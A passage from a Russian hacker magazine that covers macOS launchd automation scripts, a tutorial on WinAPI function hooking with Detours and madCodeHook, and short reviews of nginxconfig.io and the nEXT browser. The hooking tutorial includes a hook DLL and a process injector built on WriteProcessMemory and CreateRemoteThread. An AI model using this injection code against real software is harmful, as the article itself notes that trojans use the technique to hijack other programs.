чиков ответил на форуме, что на старый син таксис слишком много завязано,
чтобы убирать его.


НАСТРАИВАЕМ СКАЧИВАНИЕ СЕРИАЛОВ
Как видишь, пока что все довольно прос то, особенно если игнорировать
нововведения. Чтобы порадовать тебя более полез ным примером, расскажу,
как я при помощи launchd настроил себе ска чивание новых серий сериалов.
Признаться, дав но искал случая поделить ся им с читателями «Хакера». :‐)
  За основу я взял фид с showRSS — этот сервис позволяет зарегистри‐
роваться и сде лать персонализированный фид с магнитны ми ссыл ками
на новые серии сериалов, которые ты смотришь.





      На showRSS есть фиды для боль шинства акту альных сери алов

Всё исключительно на английском, но это именно то, что мне нужно. Если
тебе showRSS тоже придет ся по нра ву, не забудь после составления спис ка
сериалов настроить качес тво, а то будешь получать все несколько раз в раз‐
ном разрешении.
   Чтобы новые серии авто матически добавлялись в Transmission, я написал
небольшой скрипт и настро ил ему автозапуск раз в час при помощи launchctl.
Обрати внимание, что в настройках Transmission нужно будет включить RPC
(Enable remote access).





Чтобы не светить интерфейс наружу, там же можно ограничить доступ и раз‐
решить подключаться только с локальной машины (см. скриншот). Далее —
полный исходник скрип та. Тебе оста ется только пос тавить зависимости (pip
install  bs4  transmissionrpc),  добавить  свой номер  пользователя
с showRSS и указать папку для сохранения лога.


showrss-launchd.py
import urllib2
import sys
from time import sleep
import transmissionrpc
import subprocess
import bs4
import logging
user = '<твой номер>'
logfile = '/Users/<твое имя пользователя>/Library/Logs/showrss.log'
search = 'http://showrss.info/user/' + user + '.rss?magnets=true&
namespaces=true&name=clean&quality=null&re=null'
lastid = subprocess.check_output('defaults read my lastshow', shell=
True)[:‐1]
logging.basicConfig(filename=logfile,level=logging.DEBUG,format='%(
asctime)s %(message)s')
logging.info('Starting')
try:
  page = urllib2.urlopen(search).read()
except:
  logging.exception("Can't get page")
  sys.exit()
soup = bs4.BeautifulSoup(page, "html.parser")
items = soup.findAll('item')
number = 0
for item in items:
  if item.guid.string == lastid:
    break
  number += 1
logging.info('Found new episodes: ' + str(number))
if number > 0:
  subprocess.call(['open', '‐jg', '/Applications/Transmission.app'])
  sleep(5)
  tc = transmissionrpc.Client('localhost', port=9091)
  for x in range(number):
    applescript = 'display notification "{}" with title "Downlo
ading"'.format(items[x].title.contents[0])
    subprocess.call(['osascript', '‐e', applescript])
    tc.add_torrent(items[x].enclosure['url'])
  subprocess.call(['defaults', 'write', 'my', 'lastshow', items[0].
guid.string])

Код по большей части не требует пояс нений: скрипт скачивает файл RSS,
парсит его при помощи Beautiful Soup, ищет в полученном массиве ссылок
последнюю скачанную серию по GUID и затем по одной засовывает более
новые в Transmission (предваритель но запустив его и дав пять секунд на заг‐
рузку).
   Чисто маковских осо бенностей здесь две. Первая — сохранение и заг‐
рузка GUID последней серии при помощи команды defaults. Необходимости
в этом нет: вполне можно хранить эту переменную в обычном текстовом фай‐
ле и указать в конфиге launchctl каталог, в котором он лежит (ключ Work‐
ingDirectory). Но мне хотелось продемонс трировать  defaults как одну
из интересных возможностей. Подробнее об этой утилите читай в первой
статье.
  Для работы скрипта перед первым запус ком нуж но записать GUID серии,
с которой начнется скачивание (сама она скачана не будет):


$ defaults write my lastshow <guid>

Вторая использованная мной маковская фишка — это оповеще ния. Чтобы
показать сообщение при начале загрузки, я выполняю однострочник на Ap‐
pleScript (display notification … with title …). Если будешь перено‐
сить скрипт в другую ОС, просто удали строку 41.
  Осталось только добавить конфиг launchd. На этот раз будем запус кать
не по календарному интервалу, а просто каждый час. Для этого нам понадо‐
бится ключ StartInterval.


com.and.showrss.StartInterval.plist
<?xml version="1.0" encoding="UTF‐8"?>
<!DOCTYPE plist PUBLIC "‐//Apple//DTD PLIST 1.0//EN" "http://www.
apple.com/DTDs/PropertyList‐1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.and.showrss</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/and/Develop/ShowRSS/showrss‐launchd.py</
string>
    </array>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>

Здесь тебе понадобится заменить путь к скрипту своим и по желанию
поменять название файла, метку и интервал запус ка.


             INFO

                     К сожалению, совместить StartInterval и StartCal‐
                            endarInterval, что бы скрипт работал через равные
                      промежутки времени с какого‐то по какой‐то час
                      или день, невозможно. В таких случаях надо либо
                        писать  обертку,  которая  будет  активировать
                      и деактивировать запуск по StartInterval, и саму
                       ее  запускать  по   StartCalendarInterval,  либо
                       генерировать огромный кон фиг с указанием каж‐
                       дого запуска.


Еще, как видишь, я заморо чился с правиль ным логированием при помощи
модуля logging — чтобы потом было удобно смотреть, что произошло, через
утилиту Console. Но если ты ставишь на автозапуск программу, которая
выводит данные в stdout, то launchd может для тебя их отлавливать и скла‐
дывать в текстовый файл. Для это го добавь в конфиг строчки:


<key>StandardOutPath</key>
<string>путь к файлу</string>
<key>StandardErrorPath</key>
<string>путь к файлу</string>

Точно так же можно про писать StandardInPath с файлом, который будет
скармливаться на вход скрипту.


                                     Продолжение статьи →
PCZONE              ← НАЧАЛО СТАТЬИ
   КОНТРОЛИРУЕМЫЙ
              ПУСК
            АВТОМАТИЗИРУЕМ MACOS ПРИ ПОМОЩИ
                          PYTHON И LAUNCHCTL





ПИШЕМ СВОЙ «ДРОПБОКС»
Переходим к задаче номер два: научимся запускать скрипты при появлении
новых файлов в определенной пап ке. Заодно смас терим себе простенький
аналог Dropbox. Точнее — аналог ранних версий Dropbox, которые сразу же
копировали в буфер обмена ссылку на ска чива ние файла, когда кидаешь его
в заданную папку.
  В качестве хостинга я выбрал Transfer.sh, о котором как‐то писал в рубрику
WWW. Он бесплатен, не показывает рекламы и позволяет загрузить файл
одной командой из терминала. При желании можно даже поставить его
на свой сервер и подключить бакет S3.
   Если тебя такое решение не устра ивает, можешь, например, заливать
файлы на собственный FTP. Это не только будет надежнее, но и позволит
избавиться от страницы с предпросмотром картинки, которую в обя затель‐
ном порядке показывает Transfer.sh. Я, кстати, в итоге сде лал себе две папки:
одна — для своего хостинга, одна — для Transfer.sh.


uploader-transfersh.py
import os
import logging
import subprocess
import json
from urllib import quote
path = '<папка>'
logfile = '/Users/<имя>/Library/Logs/uploader‐transfersh.log'
def notify(title, message):
    applescript = 'display notification "{}" with title "{}"'.format(
message, title)
    subprocess.call(['osascript', '‐e', applescript])
logging.basicConfig(filename=logfile,level=logging.DEBUG,format='%(
asctime)s %(message)s')
logging.info('Starting at ' + os.getcwd())
if not os.path.exists('list.txt'):
    open('list.txt', 'w+')
    oldlist = ['.DS_Store']
else:
    oldlist = json.loads(open('list.txt', 'r').read())
newlist = os.listdir(path)
files = list(set(newlist) ‐ set(oldlist))
logging.info('Found new files: ' + ' '.join(files))
urls = []
for filename in files:
    try:
        url = subprocess.check_output(['curl', '‐‐upload‐file', path
+ filename, 'https://transfer.sh/' + quote(filename)])
        urls.append(url)
        logging.info('Uploading ' + filename)
    except:
        notify('Error uploading ' + filename, 'See ' + logfile)
        logging.exception("Can't upload " + filename)
if len(files) > 0:
    applescript = 'set the clipboard to "{}"'.format('\n'.join(urls))
    subprocess.call('osascript', '‐e', applescript)
    logging.info(' '.join(urls))
    open('list.txt', 'w+').write(json.dumps(newlist))
    notify('Upload complete', ' '.join(files))

Никаких нестандартных модулей на этот раз не понадобится, пропиши только
правильные пути в самом начале. Скрипт читает файл с предыдущим сос‐
тоянием указанной папки (или создает его, если запус кается впервые), све‐
ряет с текущим и, если находит новые файлы, поочередно заливает их
на Transfer.sh, сохраняя ссылки, которые тот выдает в ответ.
  Список ссылок затем копиру ется в буфер обмена при помощи одностроч‐
ника на AppleScript (я хотел использовать для этих целей команду pbcopy,
но что‐то не срослось: при вызове через launchd буфер по невыясненным
причинам очищался). Под конец новый листинг катало га сериализуется и сох‐
раняется в текстовый файл, а затем отображается опо вещение — как и в пре‐
дыдущем примере.
   Теперь самое главное — конфиг для автоматического запуска.


com.and.transfersh.WatchPaths.plist
<?xml version="1.0" encoding="UTF‐8"?>
<!DOCTYPE plist PUBLIC "‐//Apple//DTD PLIST 1.0//EN" "http://www.
apple.com/DTDs/PropertyList‐1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.and.transfersh</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/and/Develop/Uploader/uploader‐transfersh.py</
string>
    </array>
    <key>WatchPaths</key>
    <array>
        <string>/Users/and/Desktop/Transfer.sh/</string>
    </array>
    <key>WorkingDirectory</key>
    <string>/Users/and/Develop/Uploader/</string>
</dict>
</plist>

Обрати внимание, что помимо пути для запуска самого скрипта его путь
еще раз указан как WorkingDirectory. На этот раз мы сох раняем данные
в текстовый файл, поэто му заодно демонстри рую, как задать папку, которую
скрипт будет считать текущей, — в ней будет лежать «отгрузка».


             INFO

                     Ключ WatchPaths можно использовать и для
                       слежения  за  изменением файлов. Синтаксис
                        в этом случае такой же.


Конечно, у нас вышел не полный ана лог Dropbox. В час тности, файлы не уда‐
ляются с сервера, когда стираешь их локально (впрочем, Transfer.sh все рав‐
но потрет их через месяц). Также отсутс твует поддержка папок, но ее
при желании несложно реализовать.
  Вообще, огромный плюс это го метода в том, что при желании его можно
доработать по собственному усмотрению. Например, я захотел сде лать так,
чтобы, когда кладешь картинку со сло вами Screen Shot в названии файла,
скрипт бы ее уменьшал и конвертировал в JPEG. Получившийся код привожу
ниже — можешь подпилить в соответствии со сво ими нуждами и вставить
в районе строки 28.


for i, filename in enumerate(files):
    if filename.find('Screen Shot') > ‐1 and os.stat(path + filename)
.st_size > 500000:
        width = int(subprocess.check_output(['mdls', '‐name', 'kMDIte
mPixelWidth', path + filename]).split('= ')[1][:‐1])
        if width > 2000:
            subprocess.call(['sips', '‐Z', str(width/2), path +
filename])
        if subprocess.check_output(['mdls', '‐name', 'kMDItemKind',
path + filename]).find('JPEG') is ‐1:
            fileout = filename.split('.')[0] + '.jpg'
            subprocess.call(['sips', '‐s', 'format', 'jpeg', path +
filename, '‐‐out', path + fileout])
            os.remove(path + filename)
            filename = fileout
            files[i] = filename

Скрины размером более 500 Кбайт будут конвертированы в JPG, а если они
шире 2000 пикселей (то есть полный экран в моем случае), то скрипт еще и
уменьшит их вдвое.
   Что еще можно улучшить? К примеру, можешь сделать так, чтобы папка
очищалась по мере загрузки пос тупа ющих файлов. Для этого существует
специальная директива  launchd: если заменить в конфиге WatchPaths
на QueueDirectories, то скрипт будет вызываться до тех пор, пока указанный
каталог (или каталоги) не станут пус тыми. В этом случае нужно будет самос‐
тоятельно позаботиться об удалении файлов, ина че launchd будет гонять
скрипт по кругу.


БЭКАПИМ И ШИФРУЕМ ДАННЫЕ ПРИ ПОДКЛЮЧЕНИИ ФЛЕШКИ
В качестве третьей задачи я планировал сделать скрипт, который будет авто‐
матически запускаться, когда ты под ключаешь флешку или жесткий диск
с определенным названием, затем монтировать зашифрованную файловую
систему (предварительно спросив пароль) и ски дывать в нее опре деленные
файлы. Другими словами, импровизированное, но надежное хранилище
для важных данных.
  Я не подозревал, что задача ока жется нас толь ко тривиальной, что раз‐
бирать будет почти что нечего. Шифрованные контейнеры в macOS соз дают‐
ся штатными средствами. Запус кай DiskUtility, жми File → New Image → Blank
Image, заполняй название файла, наз вание тома и выбирай тип шиф рования
(AES 128 или 256 бит). Контейнер готов! При его монтировании macOS будет
спрашивать пароль.





Осталось написать скриптик, который будет подклю чать контейнер одновре‐
менно с появ лением флешки или жес ткого диска и автоматически копировать
данные. Python на этот раз точно не понадобится — хватит Bash. У меня выш‐
ло вот так.


backup.sh
if [ ‐d /Volumes/BACKUP/ ]
then
    hdiutil attach /Volumes/BACKUP/Stuff.dmg
    cp ‐fr /Users/and/Desktop/TopSecret /Volumes/Stuff/
    osascript ‐e 'Display notification with title "Backup complete"'
fi

Пути, конечно, нужно будет поправить на свои. Обра ти внимание на условие
в самом начале: оно нужно, потому что launchd сам не будет проверять, какой
именно носитель подклю чен, — он запускает скрипт при подключении любого
тома. Соответствен но, проверять, существует ли нужный путь, приходится уже
в скрипте.
  А вот как будет выглядеть конфиг launchd.


com.and.backup.StartOnMount.plist
<?xml version="1.0" encoding="UTF‐8"?>
<!DOCTYPE plist PUBLIC "‐//Apple//DTD PLIST 1.0//EN" "http://www.
apple.com/DTDs/PropertyList‐1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.and.backup</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/and/Develop/backup.sh</string>
    </array>
    <key>StartOnMount</key>
    <true/>
</dict>
</plist>

Можешь добавить удаление данных с диска или, наоборот, использовать
rsync, чтобы поддерживать содержимое пап ки и контейнера одинаковым.


ДРУГИЕ ВОЗМОЖНОСТИ
У launchd есть и другие интересные функции и настройки. По большей части
они нужны для внутрисистемных нужд, но кто зна ет, на какие технические
извраты нас потянет завтра? :‐)
   EnvironmentVariables позволяет задать переменные окружения спе‐
циально для твоего скрип та. Выглядит это так:


<key>EnvironmentVariables</key>
<dict>
    <key>PATH</key>
    <string>/bin:/usr/bin:/usr/local/bin</string>
</dict>

При желании можно сделать полноценный chroot, задав ключ RootDirectory,
или заставить задачу выполняться от имени определенного пользователя
или группы (UserName и GroupName).
  Ключ KeepAlive укажет launchd на то, что скрипт должен работать все вре‐
мя. Если он, например, упа дет, система будет пытаться поднять его снова.


<key>KeepAlive</key>
<true/>

Добавив к KeepAlive ключи SuccessfulExit и Crashed, можно задать
перезапуск только в том случае, если задача завершилась успешно или толь‐
ко если упала с ошибкой (то есть вернула ненулевой код).


<key>KeepAlive</key>
<dict>
    <key>Crashed</key>
    <true/>
</dict>

Точно так же можно поддерживать работу задачи, только если доступна
хотя бы одна сеть (или не дос тупна ни одна) — за это отвечает ключ Network‐
State — или когда существу ет или не сущес твует опре деленный путь (Path‐
State). Можно даже прицепить ся к состоянию другой задачи (OtherJobEn‐
abled).
   Ну и чтобы бедовый скрипт не сож рал все ресурсы машины в самый
неподходящий момент, можно задать разные ограничения:
 • CPU — количество про цес сорно го времени в секундах, которые раз‐
  решено потратить;
 • FileSize — максимальный размер файла, который разрешено соз‐
   давать;
 • NumberOfFiles — максимальное число одновременно откры тых фай лов;
 • Data — максимальное количес тво данных (в байтах), которые раз решено
   обрабатывать.

Ну и для совсем сложных случаев есть двухступенчатая система из мягкого
ограничения (SoftResourceLimit) и жесткого ограниче ния (HardResource‐
Limit). При превыше нии первого система вышлет процес су сигнал вроде
SIGXCPU или SIGXFSZ, а принудительно завер шит его, только если тот
не успокоится и перейдет жесткий лимит.


ИТОГИ
Как ты мог заметить, у launchd есть и недос татки. Тот же crontab — это прос‐
тая таблица, в которой наглядно видно, что и ког да запускается. С launchctl
в этом плане все непросто: конфиги раз бросаны по раз ным папкам, могут
быть вклю чены или выключены, да и внутри них все понятно далеко не с пер‐
вого взгляда.
   Если ничего, кроме запус ка по времени, тебе в итоге не нужно, то launchd
не стоит мороки — ты можешь спокойно использовать cron (занятно, что
даже он в macOS работа ет поверх launchd). Что до возможности привязы вать
скрипты к папкам, то она доступна в Automator — опять же соответс твующие
конфиги просто создадутся автоматичес ки.
  Однако если ты предпочитаешь освоить один мощный и универсальный
инструмент, то выбор определенно за launchd. Даже если скриптование все‐
го и вся тебе в ито ге не пригодится, изу чить принципы работы сис темы будет
небесполезно.


        WWW

                  •Официальная докумен тация
                      •Сайт разработчиков LaunchControl с подробной
                        документацией и примерами
                        •Пост, в котором подробно разбирается новый
                        син таксис launchctl
PCZONE
 ВОЛШЕБНЫЕ
  ХУКИ





    КАК ПЕРЕХВАТЫВАТЬ УПРАВЛЕНИЕ
   ЛЮБОЙ ПРОГРАММОЙ ЧЕРЕЗ WINAPI





Технология  перехвата  вызовов  функций
WinAPI  извес тна  уже  давно,  она  часто
используется как в тро янах и вирусах, так
и в снифферах, трейнерах для игр, а также
в любых ситуациях, когда нужно заставить              Nik Zerof                                                                                              xtahi0nix@gmail.com
чужое приложение выполнять код, которо го
там никогда не было. Я расскажу, как поль‐
зоваться этой могучей техникой, а затем мы
напишем библиотеку перехвата методом
сплайсинга.


КАКИЕ БЫВАЮТ ХУКИ
Ловушки (hook) могут быть режима пользователя (usermode) и режима ядра
(kernelmode). Установка хуков режима пользователя сводится к методу сплай‐
синга и методу правки таблиц  IAT. Ограничения этих методов очевидны:
перехватить можно толь ко userspace API, а вот до функций с префиксом Zw*,
Ki* и прочих «ядерных» из режима пользователя дотянуться нельзя.
   Установка хуков режима ядра позволяет менять любую информацию,
которой опе рирует Windows на самом низком уровне. Для перехватов подоб‐
ного типа необходимо модифицировать таблицы SSDT/IDT либо менять само
тело функции (kernel patch). Надо сказать, что в Windows на архитектуре
x64 ядро контролирует свою целос тность при помощи механизма KPP (Kernel
Patch Protection), который является частью PatchGuard и прос то так подобные
манипуляции с системными таблицами сделать не поз волит.


ПОЧЕМУ ХУКИ РАБОТАЮТ?
Когда Windows запускает приложение, соз дается его процесс и потоки, заг‐
рузчик ОС ищет зависимос ти динамичес ких биб лиотек, которые нужны
для работы программы. Поиск ведется сна чала в папке, где находится
исполняемый файл, далее в нес коль ких сис темных папках. Пос ле того
как нужные библиотеки найдены, определяются необходимые для работы
функции, составляется таблица зависимос тей функций и биб лиотек, где они
находятся. Программа помнит все эти данные и пользуется ими при вызове
функций. Наша задача — загрузить в адресное пространс тво приложения
нашу библиотеку и испра вить таблицу зависимос тей в программе таким
образом, чтобы она думала, будто функции, которые ей нужны, находятся
именно в нашей библиотеке, а не в той, где они были раньше.


СПЛАЙСИНГ ФУНКЦИЙ WINAPI
Про лог фун кций, трамплин и дизассемблер длин инструк ций
Функции WinAPI начина ются с про лога — это стандартный код, отвечающий
за балансировку стека для корректного доступа к локальным переменным,
которые использует функция. Обычно пролог выглядит таким образом:


mov edi,edi
push ebp
mov ebp,esp

В большинстве функций он одинаков, и поэтому на его мес то можно добавить
инструкцию безусловного перехода  jmp,  которая передаст управле ние
на наш код. Это называется «трамплин» — мы просто уводим поток выпол‐
нения функции в наш код, где делаем все, что хотим: можем под менить
результат выполнения функции, можем вызвать какой‐то дру гой код, запус‐
тить процесс — одним сло вом, массу всего. Но чтобы грамотно реализовать
перехватчик функций методом сплайсин га, нам нужен дизас семблер длин
инструкций.


             INFO

                   Дизассемблер длин позволяет вычислять длины
                      команд процессора. Часто используется для ана‐
                       лиза прологов функций.


Зачем нам использовать дизас семблер длин, если мы и так знаем пролог
функций? Дело в том, что прологи функций отличаются. Не хотелось бы пос‐
тоянно заглядывать в дизас семблер и проверять, подходит ли пролог оче‐
редной перехватываемой функции под наш сплайсер. В нем ведь четко про‐
писано, какое количество байтов мы будем использовать.
  В том случае, если мы «настро им» нашу функцию сплай синга на стандар‐
тный пролог, а он окажется другим, то пос ле реализации перехвата выпол‐
нение может пойти не с начала машинной команды, а с какой‐то ее части.
Одним словом, мы повредим код программы, она вызовет исключение
и будет аварийно завершена операционной системой. Если же использовать
дизассемблер длин инструкций, то сплайсер всегда точно будет знать, где
начинается следующая инс трукция, и корректно встраивать трамплин.


Биб лиоте ки для перехвата
Как ты уже понял, для написа ния качес твенного универсального сплайсера
функций нужно затратить мно го сил и времени, и даже крупные фирмы пред‐
почитают для своих проектов покупать готовые биб лиотеки, реализующие
перехваты функций.
  Мы рассмотрим два популярных коммерчес ких решения: Detours про‐
изводства непосредственно Microsoft и биб лиотеку madCodeHook. Почему
именно эти две библиотеки? На них можно реализовать перехват с миниму‐
мом кода, что как нельзя лучше подходит для обучения. Полные версии обеих
библиотек платные, но для обучения можно либо использовать ограниченные
бесплатные вер сии, либо покупать полные, либо... ну, ты знаешь. :‐)
  С готовой библиотекой мы будем уверены, что
 • в ней встроен качественный дизассемблер длин, который не испугается
   разнообразных функций WinAPI;
 • встроен специальный корректор кода, способ ный работать вместе с фун‐
   кцией, реализующей трамплины;
 • при сборке проекта будут использованы блоки условной компиляции кода
   и нам не придется менять синтаксис перехватов при смене архитектур
   x86 и x64.

Одним словом, мы будем уверены, что в нашей DLL окажутся все необ‐
ходимые функции.


Тестовое приложе ние
Для начала экспериментов с перехватами напишем тестовое приложение,
назовем его test1.exe. Оно ничего не делает. Точнее, просто ждет 60 секунд,
используя функцию WinAPI Sleep(), а потом закрывается. Я выбрал эту фун‐
кцию специально, чтобы было понятно, что изначально наше приложение
неспособно, например, создавать файлы.


#include <Windows.h>
#include <iostream>
void slp();
int main()
{
int x;
std:cout << "Enter 1: \n";
std::cin >> x;
if (x == 1) slp();
return 0;
}
void slp()
{
Sleep(60000);
}

Здесь все понят но: при запус ке приложение ожидает ввода цифры 1, потом
запускает функцию Sleep(). Нам это необ ходимо, чтобы программа не зак‐
рылась слишком быстро и повисела немного в памяти, ожидая ввода. Ну
и заодно наших инъекций библиотеки перехвата в ее адресное прос транство.
:‐)
   Теперь переходим к реализации самой динамической библиоте ки. Наша
библиотека (назовем ее HookA.dll) перехватывает вызов Sleep() и заменя‐
ет его вызовом CreateFile, который создает в корне диска C: пустой файл
по имени virus.exe. Сначала код с использованием библиотеки Detours.


#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include "detours.h"
VOID(WINAPI * TrueSleep)(DWORD dwMilliseconds) = Sleep;
__declspec(dllexport) VOID WINAPI MySleep(DWORD dwMilliseconds)
{
HANDLE hFile = CreateFile(L"c:\\virus.exe", GENERIC_WRITE, 0, NULL,
CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
CloseHandle(hFile);
}
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)TrueSleep, MySleep);
        DetourTransactionCommit();
    }
    return TRUE;
}

При использовании Detours перехват реализует ся строкой DetourAttach(&(
PVOID&)TrueSleep, MySleep), которая вызыва ет внутреннюю функцию De‐
tourAttach с параметрами прототипа нас тоящей функции Sleep() по име ни
TrueSleep, и ее подделкой,  которую  написа ли мы  (MySleep). Важно
понимать, что наша функция должна соответс твовать оригиналу по парамет‐
рам и конвенциям вызова.
   Теперь  все  то  же  самое,  только  с  использованием  библиотеки
madCodeHook.


#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include "madCHook.h"
VOID(WINAPI * TrueSleep)(DWORD dwMilliseconds) = Sleep;
__declspec(dllexport) VOID WINAPI MySleep(DWORD dwMilliseconds)
{
    HANDLE hFile = CreateFile(L"c:\\virus.exe", GENERIC_WRITE, 0,
NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CloseHandle(hFile);
}
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        HookAPI("User32.dll", "Sleep", MySleep, (PVOID*) &TrueSleep);
    }
    return TRUE;
}

Код реализации практичес ки не изменил ся, за исклю чением строки HookAPI(
"User32.dll",  "Sleep",  MySleep,  (PVOID*)  &TrueSleep); и под клю‐
чения заголовочного файла madCHook.h. В этой строчке кода мы видим, что
функция Sleep из системной библиотеки User32.dll будет заменена нашей
реализацией.


             INFO

                    Перед  тем  как  что‐то  перехватывать,  нужно
                        понимать, чего мы хотим этим добиться. Мы
                       хотим менять пути сохранения рабочих данных
                       программы?  Путать  фун кции?  Саботировать
                      вычисления? В любом случае для исследования
                      приложения нам понадо бит ся API Monitor, прог‐
                      рамма,  которая  показывает,  какие  функции
                       WinAPI использует приложение.


Итак, подопытное приложение готово, наша «вирус ная» библиотека тоже,
теперь  осталось  разоб рать ся,  как можно  зас тавить DLL  прицепиться
к нашему приложению. Для этого есть нес колько способов, мы рассмотрим
два из них.
  Первый способ заключается в использовании при ложе ния withdll.exe,
которое идет вместе с библиотекой Detours. Если положить это приложе ние
в одну папку с нашими файлами test1.exe и HookA.dll, при соединить биб‐
лиотеку‐перехватчик мож но командой withdll.exe ‐d:HookA.dll test1.
exe. Далее приложение withdll.exe запустит наш файл test1.exe с уже
присоединенной библиотекой.
   Это неудобно и не всегда подходит нам. Что, если нужно инжектировать
библиотеку‐перехватчик в уже работающий про цесс? Второй способ зак‐
лючается в написании приложения‐инжекто ра, которое присоединит нашу
библиотеку‐перехватчик к работающему процессу.


Инжектор
Для правильной работы инжектора нам нужно получить привиле гию SE_DE‐
BUG_NAME. Напишем универ сальную функцию, которая получит нужную нам
привилегию. Ее‐то мы и переда дим в качес тве аргу мента.


BOOL setPrivileges(LPCTSTR szPrivName)
{
    TOKEN_PRIVILEGES tp = { 0 };
    HANDLE hToken = 0;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PR
IVILEGES, &hToken))
        std::cout << "OpenProcessToken failed\n";
    if (!LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].
Luid))
        std::cout << "LookupPrivilegeValue failed\n";
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL,
NULL))
    {
        std::cout << "AdjustTokenPrivileges failed\n";
        CloseHandle(hToken);
        return TRUE;
    }
    return FALSE;

Вызов функции для получения SE_DEBUG_NAME будет таким:


setPrivileges(SE_DEBUG_NAME);

Теперь для работы инжектора нужно написать функцию, которая будет
получать PID процесса для инжекта по его имени.


DWORD getPIDproc(wchar_t * procname)
{
    DWORD pid;
    HANDLE pHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 ProcEntry;
    ProcessEntry.dwSize = sizeof(ProcEntry);
    do
    {
        if (!_wcsicmp(ProcEntry.szExeFile, procname))
        {
            DWORD pid = ProcEntry.th32ProcessID;
            CloseHandle(pHandle);
            return pid;
        }
    } while (Process32Next(pHandle, &ProcEntry));
    CloseHandle(pHandle);
    return 0;
}

Все готово для написания основного кода инжектора. Приступим!


BOOL inject()
{
    HANDLE victProc = OpenProcess(PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION
        | PROCESS_VM_WRITE
        | PROCESS_VM_READ,
        false,
        getPIDproc(proc));
    if (victProc) {
        LPVOID pPathBuffer = (PWSTR)VirtualAllocEx(victProc, NULL,
dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (pPathBuffer == NULL) std::cout << "VirtualAllocEx err\n";
        WriteProcessMemory(victProc, pPathBuffer, (PVOID)path, dwSize
, NULL);
        if (pPathBuffer == NULL) std::cout << "WriteProcessMemory err
\n";
        HANDLE hRemoteThread = CreateRemoteThread(victProc, NULL, 0,
            (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(
"kernel32.dll"), "LoadLibraryW"),
            pPathBuffer, 0, NULL);
        if (hRemoteThread == NULL) std::cout << "CreateRemoteThread
err\n";
        else {
        CloseHandle(hRemoteThread);
        return TRUE;
            }
    return FALSE;
}

И вызывающий все эти функции код:


int main()
{
    setPrivileges(SE_DEBUG_NAME);
    std::cout << "test1.exe: " << getPIDproc(proc) << "\n";
    inject();
}

После выполнения этой программы в Process Explorer мы сможем увидеть,
что к процессу под именем test1.exe присоединилась биб лиотека HookA.
dll, а при вводе символа 1 в наше приложение в корне диска C: появляется
пустой файл virus.exe.





                   Результат работы инжектора


ИТОГО
Мы познакомились с механизмом перехвата WinAPI‐функций, попытались
вникнуть в техническую сторону процесса перехвата и реализовали учебный
перехват функции Sleep() в тес товом при ложении. Теперь у тебя дос таточно
знаний и опыта, чтобы про должить изучение темы перехватов самостоятель‐
но.
PCZONE





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



       NGINXCONFIG.IO — САЙТ, КОТОРЫЙ ПОМОЖЕТ
      НАСТРОИТЬ ВЕБ-СЕРВЕР NGINX1         Nginx — это прекрасный быс трый веб‐сервер, на котором работает
         что‐то око ло половины интернета. Увы, дос тоинство, которым nginx
        не обладает, — это простота нас трой ки. К тому же установка
        веб‐сер вера — это обычно вещь, которую делаешь один раз и не
        повторяешь годами. Как в таких условиях запомнить все хитроспле‐
        тения конфигов?





        Сайт nginxconﬁg.io станет для тебя небольшим (или большим —
         как повезет) подспорьем в этом неп ростом деле. По сути, это что‐то
        вроде графической надс тройки для конфигурирования: в левом
        столбце ты выставляешь галочки и заполняешь поля, а рядом
        по ходу дела меня ется текст конфига.
          Для каждого из пунктов меню есть полезные всплывающие под‐
         сказки. А еще сервис услужливо добавляет к основному конфигу все
        сопутствующие вещи. Например, если добавить опцию HTTPS, то он
        выдаст команды для соз дания ключей.
        Однако пол ностью обойтись удоб ными галочками и не лезть
        в код конфига вряд ли получится. Что, если тебе нужен поддомен?
         Что, если твое приложение написано не на PHP? В общем, nginxcon‐
          ﬁg.io предоставляет отличный шаблон, но подкрутить и подпилить
        его придется самому.


      NEXT — МИНИМАЛИСТИЧНЫЙ БРАУЗЕР В СТИЛЕ EMACS

       Собери достаточно боль шую команду гиков, и сре ди них обязатель‐2        но найдутся ценители ста ринных тексто вых редакторов. Они навер‐
        няка есть и среди наших читателей — уж не говоря про саму редак‐
        цию. Поэтому пройти мимо новейших попыток использовать про‐
        веренные временем идеи Vim и Emacs мы не можем никак.





        nEXT — это попытка сделать бра узер таким, каким его примут
        и полюбят поклонники Emacs. А это значит, что без предваритель‐
        ной подготов ки пос ле его запуска ты не сможешь сделать вооб ще
         ничего: это просто пустое белое окно.
         Открывай ма нуал и начинай читать список шоткатов. И вот ты уже
        знаешь, что Ctrl‐l — это вызов адресной строки, Ctrl‐b — «назад»,
        а Ctrl‐g выводит рядом с каждой ссылкой на странице двухбуквенное
        сочетание. Вводишь его и переходишь в место наз начения.





       Другая уникальная черта nEXT (помимо необ ходимости зубрить шот‐
         каты) — это древовидная история. Кро ме обычного перехода впе‐
